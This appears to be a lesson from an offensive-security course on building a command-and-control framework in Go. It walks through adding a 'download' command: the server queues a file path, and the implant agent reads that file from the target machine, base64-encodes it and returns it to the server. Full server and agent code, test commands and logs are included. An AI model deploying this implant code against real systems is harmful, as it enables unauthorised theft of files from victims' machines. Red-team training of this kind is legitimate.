---
layout: course01
title: "Lesson 22: Download Command"
---


## Solutions

- **Starting Code:** [lesson_22_begin](https://github.com/faanross/antisyphon_course_c2_golang/tree/master/lesson_22_begin)
- **Completed Code:** [lesson_22_end](https://github.com/faanross/antisyphon_course_c2_golang/tree/master/lesson_22_end)

## Overview

Now that we have a complete command execution framework, let's see how easy it is to add new commands. This is the "payoff" lesson - the architecture we've built makes extension trivial.

We'll implement a **download command** that:

1. Operator specifies a file path on the agent's machine
2. Agent reads that file
3. Agent sends the file contents back to the server

This demonstrates that adding new capabilities follows a predictable pattern:

1. Create argument types (client and agent)
2. Add validator and processor on server
3. Add orchestrator on agent
4. Add doer on agent
5. Register the command

Let's see how quickly we can add a complete new command!

## What We'll Create

- `DownloadArgsClient` and `DownloadArgsAgent` types in `models/types.go`
- `validateDownloadCommand` and `processDownloadCommand` in `control/download.go`
- `orchestrateDownload` in `agent/download.go`
- Registry updates for the new command
- Result type for download data

## Part 1: Server-Side Types and Processing

### Create Argument Types

First, let's define what the client sends and what the agent receives. Add to `models/types.go`:

```go
// DownloadArgsClient - what the client sends (operator requests a file)
type DownloadArgsClient struct {
	FilePath string `json:"file_path"` // Path on agent's machine
}

// DownloadArgsAgent - what we send to the agent (same in this case)
type DownloadArgsAgent struct {
	FilePath string `json:"file_path"` // Path on agent's machine
}

// DownloadResult - what the agent sends back
type DownloadResult struct {
	FilePath    string `json:"file_path"`
	FileData    string `json:"file_data"`    // Base64 encoded file contents
	FileSize    int64  `json:"file_size"`    // Original file size in bytes
	Success     bool   `json:"success"`
	ErrorMsg    string `json:"error,omitempty"`
}
```

**Understanding the structure:**

- **DownloadArgsClient** - The operator specifies a file path on the target machine
- **DownloadArgsAgent** - For download, it's the same as client args (no transformation needed like shellcode)
- **DownloadResult** - Contains the file data (base64 encoded), size, and success status

### Create Validator and Processor

Create `internal/control/download.go`:

```go
package control

import (
	"encoding/json"
	"fmt"
	"log"

	"your-module/internal/models"
)

// validateDownloadCommand validates "download" command arguments from client
func validateDownloadCommand(rawArgs json.RawMessage) error {
	if len(rawArgs) == 0 {
		return fmt.Errorf("download command requires arguments")
	}

	var args models.DownloadArgsClient

	if err := json.Unmarshal(rawArgs, &args); err != nil {
		return fmt.Errorf("invalid argument format: %w", err)
	}

	if args.FilePath == "" {
		return fmt.Errorf("file_path is required")
	}

	log.Printf("Download validation passed: file_path=%s", args.FilePath)
	return nil
}

// processDownloadCommand processes download arguments (minimal for this command)
func processDownloadCommand(rawArgs json.RawMessage) (json.RawMessage, error) {
	var clientArgs models.DownloadArgsClient

	if err := json.Unmarshal(rawArgs, &clientArgs); err != nil {
		return nil, fmt.Errorf("unmarshaling args: %w", err)
	}

	// For download, we just pass the file path as-is
	agentArgs := models.DownloadArgsAgent{
		FilePath: clientArgs.FilePath,
	}

	processedJSON, err := json.Marshal(agentArgs)
	if err != nil {
		return nil, fmt.Errorf("marshaling processed args: %w", err)
	}

	log.Printf("Download processed: requesting file %s from agent", clientArgs.FilePath)
	return processedJSON, nil
}
```

**Note the simplicity:** Unlike shellcode (which needed file reading and base64 encoding on the server), download just passes the path through. The actual file reading happens on the agent.

### Register the Command

Add to the `validCommands` map in `control/command_api.go`:

```go
var validCommands = map[string]struct {
	Validator CommandValidator
	Processor CommandProcessor
}{
	"shellcode": {
		Validator: validateShellcodeCommand,
		Processor: processShellcodeCommand,
	},
	"download": {  // NEW
		Validator: validateDownloadCommand,
		Processor: processDownloadCommand,
	},
}
```

That's it for the server side! Notice how the pattern is identical to shellcode - just different validation and processing logic.

## Part 2: Agent-Side Implementation

### Create the Orchestrator

Create `agent/download.go`:

```go
package agent

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"os"

	"your-module/internal/control"
	"your-module/internal/models"
	"your-module/internal/server"
)

// orchestrateDownload is the orchestrator for the "download" command
func (agent *HTTPSAgent) orchestrateDownload(job *server.HTTPSResponse) AgentTaskResult {

	// Unmarshal the arguments
	var downloadArgs control.DownloadArgsAgent
	if err := json.Unmarshal(job.Arguments, &downloadArgs); err != nil {
		errMsg := fmt.Sprintf("Failed to unmarshal DownloadArgs for Task ID %s: %v", job.JobID, err)
		log.Printf("|ERR DOWNLOAD ORCHESTRATOR| %s", errMsg)
		return AgentTaskResult{
			JobID:   job.JobID,
			Success: false,
			Error:   errors.New("failed to unmarshal DownloadArgs"),
		}
	}

	log.Printf("|DOWNLOAD ORCHESTRATOR| Task ID: %s. Downloading file: %s",
		job.JobID, downloadArgs.FilePath)

	// Agent-side validation
	if downloadArgs.FilePath == "" {
		log.Printf("|ERR DOWNLOAD ORCHESTRATOR| Task ID %s: FilePath is empty.", job.JobID)
		return AgentTaskResult{
			JobID:   job.JobID,
			Success: false,
			Error:   errors.New("FilePath cannot be empty"),
		}
	}

	// Call the doer
	result := doDownload(downloadArgs.FilePath)

	// Build the final result
	finalResult := AgentTaskResult{
		JobID: job.JobID,
	}

	outputJSON, _ := json.Marshal(result)
	finalResult.CommandResult = outputJSON

	if !result.Success {
		log.Printf("|ERR DOWNLOAD ORCHESTRATOR| Download failed for TaskID %s: %s",
			job.JobID, result.ErrorMsg)
		finalResult.Error = errors.New(result.ErrorMsg)
		finalResult.Success = false
	} else {
		log.Printf("|DOWNLOAD SUCCESS| Downloaded %d bytes from %s for TaskID %s",
			result.FileSize, downloadArgs.FilePath, job.JobID)
		finalResult.Success = true
	}

	return finalResult
}

// doDownload performs the actual file reading
func doDownload(filePath string) models.DownloadResult {
	result := models.DownloadResult{
		FilePath: filePath,
	}

	// Check if file exists
	fileInfo, err := os.Stat(filePath)
	if err != nil {
		result.Success = false
		result.ErrorMsg = fmt.Sprintf("file not found: %v", err)
		return result
	}

	// Check if it's a regular file (not directory)
	if fileInfo.IsDir() {
		result.Success = false
		result.ErrorMsg = "path is a directory, not a file"
		return result
	}

	result.FileSize = fileInfo.Size()

	// Read the file
	file, err := os.Open(filePath)
	if err != nil {
		result.Success = false
		result.ErrorMsg = fmt.Sprintf("failed to open file: %v", err)
		return result
	}
	defer file.Close()

	fileBytes, err := io.ReadAll(file)
	if err != nil {
		result.Success = false
		result.ErrorMsg = fmt.Sprintf("failed to read file: %v", err)
		return result
	}

	// Encode to base64 for safe JSON transmission
	result.FileData = base64.StdEncoding.EncodeToString(fileBytes)
	result.Success = true

	log.Printf("|DOWNLOAD DOER| Read %d bytes from %s", len(fileBytes), filePath)
	return result
}
```

### Breaking Down the Doer

**Check if file exists:**

```go
fileInfo, err := os.Stat(filePath)
if err != nil {
    result.Success = false
    result.ErrorMsg = fmt.Sprintf("file not found: %v", err)
    return result
}
```

`os.Stat` returns file information. If the file doesn't exist, we return an error immediately.

**Check if it's a regular file:**

```go
if fileInfo.IsDir() {
    result.Success = false
    result.ErrorMsg = "path is a directory, not a file"
    return result
}
```

Prevent downloading directories (which would fail anyway).

**Read and encode:**

```go
fileBytes, err := io.ReadAll(file)
result.FileData = base64.StdEncoding.EncodeToString(fileBytes)
```

Read all bytes and encode to base64 for safe JSON transmission.

### Register the Orchestrator

Update `registerCommands()` in `agent/commands.go`:

```go
func registerCommands(agent *HTTPSAgent) {
	agent.commandOrchestrators["shellcode"] = (*HTTPSAgent).orchestrateShellcode
	agent.commandOrchestrators["download"] = (*HTTPSAgent).orchestrateDownload  // NEW
}
```

Done! The download command is now fully functional.

## Understanding the Pattern

Look how consistent this is with shellcode:

| Step | Shellcode | Download |
|------|-----------|----------|
| 1. Types | ShellcodeArgsClient/Agent | DownloadArgsClient/Agent |
| 2. Validator | validateShellcodeCommand | validateDownloadCommand |
| 3. Processor | processShellcodeCommand | processDownloadCommand |
| 4. Orchestrator | orchestrateShellcode | orchestrateDownload |
| 5. Doer | DoShellcode (interface) | doDownload (simple func) |
| 6. Register | Add to validCommands | Add to validCommands |

The architecture makes this **predictable and fast**. Adding a new command follows the same pattern every time.

## Test

Let's test the download command!

**Start the server:**

```bash
go run ./cmd/server
```

**Start the agent:**

```bash
go run ./cmd/agent
```

**Queue a download command:**

```bash
curl -X POST http://localhost:8080/command \
  -d '{
    "command": "download",
    "data": {
      "file_path": "/etc/hostname"
    }
  }'
```

**Expected client response:**

```bash
"Received command: download"
```

**Expected server output:**

```bash
2025/11/08 14:22:05 Received command: download
2025/11/08 14:22:05 Download validation passed: file_path=/etc/hostname
2025/11/08 14:22:05 Download processed: requesting file /etc/hostname from agent
2025/11/08 14:22:05 QUEUED: download
2025/11/08 14:22:08 Endpoint / has been hit by agent
2025/11/08 14:22:08 DEQUEUED: Command 'download'
2025/11/08 14:22:08 Sending command to agent: download
2025/11/08 14:22:08 Job ID: job_582947
2025/11/08 14:22:08 Endpoint /results has been hit by agent
2025/11/08 14:22:08 Job (ID: job_582947) has succeeded
```

**Expected agent output:**

```bash
2025/11/08 14:22:08 Job received from Server
-> Command: download
-> JobID: job_582947
2025/11/08 14:22:08 AGENT IS NOW PROCESSING COMMAND download with ID job_582947
2025/11/08 14:22:08 |DOWNLOAD ORCHESTRATOR| Task ID: job_582947. Downloading file: /etc/hostname
2025/11/08 14:22:08 |DOWNLOAD DOER| Read 12 bytes from /etc/hostname
2025/11/08 14:22:08 |DOWNLOAD SUCCESS| Downloaded 12 bytes from /etc/hostname for TaskID job_582947
2025/11/08 14:22:08 |AGENT TASK|-> Sending result for Task ID job_582947 (142 bytes)...
2025/11/08 14:22:08 SUCCESSFULLY SENT FINAL RESULTS BACK TO SERVER.
```

**Test error handling (file not found):**

```bash
curl -X POST http://localhost:8080/command \
  -d '{
    "command": "download",
    "data": {
      "file_path": "/nonexistent/file.txt"
    }
  }'
```

The agent will return an error result with "file not found" message.

## The Payoff

This lesson demonstrates the value of good architecture:

1. **Time to implement:** Adding download took us ~100 lines of straightforward code
2. **No RunLoop changes:** The execution framework handled everything
3. **Consistent patterns:** Same structure as shellcode, easy to understand
4. **Error handling:** Built into the framework automatically
5. **Result delivery:** The SendResult infrastructure was already there

Every future command you add will follow this same pattern:

- Upload (send file to agent)
- Execute (run shell command)
- Screenshot (capture screen)
- Keylogger (start/stop)
- Process list (enumerate running processes)

The hard work of building the framework pays dividends with every new capability.

## Conclusion

In this lesson, we demonstrated framework extensibility:

- Created download argument types (client and agent)
- Implemented server-side validation and processing
- Created the agent-side orchestrator and doer
- Registered the command in both server and agent
- Tested the complete flow
- Understood the consistent pattern for adding commands

This "payoff" lesson shows that the architecture we built in previous lessons makes extending the framework fast and predictable.

In the next (and final) lesson, we'll implement persistence - making the agent survive reboots!

---

[Previous: Lesson 21 - Server Receives Results](/courses/course01/lesson-21) | [Next: Lesson 23 - Persistence](/courses/course01/lesson-23) | [Course Home](/courses/course01)
